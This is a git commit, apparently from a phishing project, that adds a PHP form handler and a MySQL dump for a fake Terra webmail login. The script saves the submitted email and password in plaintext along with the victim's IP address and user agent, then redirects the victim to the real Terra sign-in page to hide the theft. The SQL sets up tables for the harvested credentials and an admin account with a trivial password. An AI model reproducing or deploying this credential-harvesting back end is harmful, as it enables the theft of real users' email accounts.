875d911b9c6be505ad6a95c7d3b7dedbcf3b00c9
powerzim <testando.info01@gmail.com>
2024-08-22 11:32:35 -0300

    Add files via upload

---
+++ receber.php
@@ -0,0 +1,74 @@
+﻿<?php
+// Inicializa as variáveis
+$message = '';
+$message_class = '';
+
+// Verifica se os dados foram submetidos através do método POST
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    // Configurações do banco de dados
+    $servername = "localhost";
+    $username = "root";
+    $password = "";
+    $dbname = "terra";
+
+    // Cria uma conexão com o banco de dados
+    $conn = new mysqli($servername, $username, $password, $dbname);
+
+    // Verifica se a conexão foi estabelecida com sucesso
+    if ($conn->connect_error) {
+        die("Erro na conexão com o banco de dados: " . $conn->connect_error);
+    }
+
+    // Obtém os dados enviados pelo formulário
+    $user = $_POST["username"];
+    $pass = $_POST["password"];
+    // Obtém o IP do cliente
+    $ip = $_SERVER['REMOTE_ADDR'];
+    // Obtém o User Agent do cliente
+    $user_agent = $_SERVER['HTTP_USER_AGENT'];
+    // Obtém a hora e a data atual
+    $data_hora = date('Y-m-d H:i:s');
+    // Simula a obtenção da localização (substitua isso com a lógica real para obter a localização)
+    $localizacao = "Não disponível";
+
+    // Validação e filtro de entrada
+    $user = htmlspecialchars($user);
+    $pass = htmlspecialchars($pass);
+
+    // Verifica se o email já está cadastrado no banco de dados
+    $sql_check = "SELECT COUNT(*) AS total FROM usuarios WHERE email = ?";
+    $stmt_check = $conn->prepare($sql_check);
+    $stmt_check->bind_param("s", $user);
+    $stmt_check->execute();
+    $result = $stmt_check->get_result();
+    $row = $result->fetch_assoc();
+    $count = $row['total'];
+
+    if ($count > 0) {
+        // O email já está cadastrado, exiba uma mensagem de erro ou faça o que for apropriado
+        $message_class = "error";
+        $message = "Este email já está cadastrado.";
+    } else {
+        // O email não está cadastrado, então insira os dados no banco de dados
+        $sql_insert = "INSERT INTO usuarios (email, senha, ip, user_agent, data_hora, localizacao) 
+                VALUES (?, ?, ?, ?, ?, ?)";
+        $stmt_insert = $conn->prepare($sql_insert);
+        $stmt_insert->bind_param("ssssss", $user, $pass, $ip, $user_agent, $data_hora, $localizacao);
+        
+        if ($stmt_insert->execute()) {
+            // Redireciona para o site desejado após a inserção bem-sucedida
+            header("Location: https://mail.terra.com.br/signin?utm_source=portal-terra&utm_medium=home&_gl=1*1n8h2q3*_ga*MTMwMDIwMzI0Ni4xNzIwNjM0Mzk3*_ga_6PE2SMXCWW*MTcyNDI5MTkwNC4zLjAuMTcyNDI5MTkwNC42MC4wLjA.");
+            exit(); // Interrompe a execução do código PHP após o redirecionamento
+        } else {
+            $message_class = "error";
+            $message = "Houve um erro ao inserir seus dados. Por favor, tente novamente mais tarde.";
+        }
+        
+        $stmt_insert->close();
+    }
+    $stmt_check->close();
+
+    // Fecha a conexão com o banco de dados
+    $conn->close();
+}
+?>
---
+++ terra.sql
@@ -0,0 +1,117 @@
+-- phpMyAdmin SQL Dump
+-- version 5.2.1
+-- https://www.phpmyadmin.net/
+--
+-- Host: 127.0.0.1
+-- Tempo de geração: 19/05/2024 às 20:40
+-- Versão do servidor: 10.4.32-MariaDB
+-- Versão do PHP: 8.2.12
+
+SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
+START TRANSACTION;
+SET time_zone = "+00:00";
+
+
+/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
+/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
+/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
+/*!40101 SET NAMES utf8mb4 */;
+
+--
+-- Banco de dados: `webmail`
+--
+
+-- --------------------------------------------------------
+
+--
+-- Estrutura para tabela `acessos`
+--
+
+CREATE TABLE `acessos` (
+  `id` int(11) NOT NULL,
+  `data_acesso` timestamp NOT NULL DEFAULT current_timestamp()
+) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
+
+-- --------------------------------------------------------
+
+--
+-- Estrutura para tabela `administradores`
+--
+
+CREATE TABLE `administradores` (
+  `id` int(11) NOT NULL,
+  `username` varchar(50) NOT NULL,
+  `password` varchar(100) NOT NULL
+) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
+
+--
+-- Despejando dados para a tabela `administradores`
+--
+
+INSERT INTO `administradores` (`id`, `username`, `password`) VALUES
+(1, 'Louis Vapo', '123456');
+
+-- --------------------------------------------------------
+
+--
+-- Estrutura para tabela `usuarios`
+--
+
+CREATE TABLE `usuarios` (
+  `id` int(11) NOT NULL,
+  `email` varchar(255) NOT NULL,
+  `senha` varchar(255) NOT NULL,
+  `ip` varchar(45) NOT NULL,
+  `user_agent` text NOT NULL,
+  `data_hora` datetime NOT NULL,
+  `localizacao` varchar(255) NOT NULL
+) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
+
+--
+-- Índices para tabelas despejadas
+--
+
+--
+-- Índices de tabela `acessos`
+--
+ALTER TABLE `acessos`
+  ADD PRIMARY KEY (`id`);
+
+--
+-- Índices de tabela `administradores`
+--
+ALTER TABLE `administradores`
+  ADD PRIMARY KEY (`id`);
+
+--
+-- Índices de tabela `usuarios`
+--
+ALTER TABLE `usuarios`
+  ADD PRIMARY KEY (`id`);
+
+--
+-- AUTO_INCREMENT para tabelas despejadas
+--
+
+--
+-- AUTO_INCREMENT de tabela `acessos`
+--
+ALTER TABLE `acessos`
+  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=14;
+
+--
+-- AUTO_INCREMENT de tabela `administradores`
+--
+ALTER TABLE `administradores`
+  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
+
+--
+-- AUTO_INCREMENT de tabela `usuarios`
+--
+ALTER TABLE `usuarios`
+  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=7;
+COMMIT;
+
+/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
+/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
+/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
